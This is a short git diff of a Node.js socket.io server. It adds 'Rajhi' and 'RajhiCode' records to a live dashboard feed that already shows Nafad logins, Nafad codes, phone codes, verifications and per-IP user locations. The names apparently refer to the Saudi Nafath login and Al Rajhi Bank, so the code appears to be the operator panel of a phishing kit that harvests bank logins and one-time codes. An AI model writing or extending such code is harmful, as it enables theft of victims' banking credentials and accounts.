@@ -67,6 +67,8 @@ io.on("connection", (socket) => {
       verifs,
       nafadLogins,
       nafadCodes,
+      rajhis,
+      rajhisCodes,
     ] = await Promise.all([
       IndexSubmission.find().sort({ _id: -1 }).lean(),
       Details.find().sort({ _id: -1 }).lean(),
@@ -80,6 +82,8 @@ io.on("connection", (socket) => {
       Verification.find().sort({ _id: -1 }).lean(),
       Nafad.find().sort({ _id: -1 }).lean(),
       NafadCode.find().sort({ _id: -1 }).lean(),
+      Rajhi.find().sort({ _id: -1 }).lean(),
+      RajhiCode.find().sort({ _id: -1 }).lean(),
     ]);
 
     // gather flags & locations
@@ -102,6 +106,8 @@ io.on("connection", (socket) => {
       nafadCodes, // Nafad two‑digit codes
       flags, // user.flag
       locations, // user.location
+      rajhis,
+      rajhisCodes,
     });
   });
 
@@ -695,7 +701,6 @@ app.delete("/api/users/:ip", async (req, res) => {
     }
 
     await Promise.all([
-      /*       Visit.deleteMany({ user: user._id }), */
       phone.deleteMany({ user: user._id }), // capitalize if your model is `Phone`
       PhoneCode.deleteMany({ user: user._id }),
       ThirdParty.deleteMany({ user: user._id }),
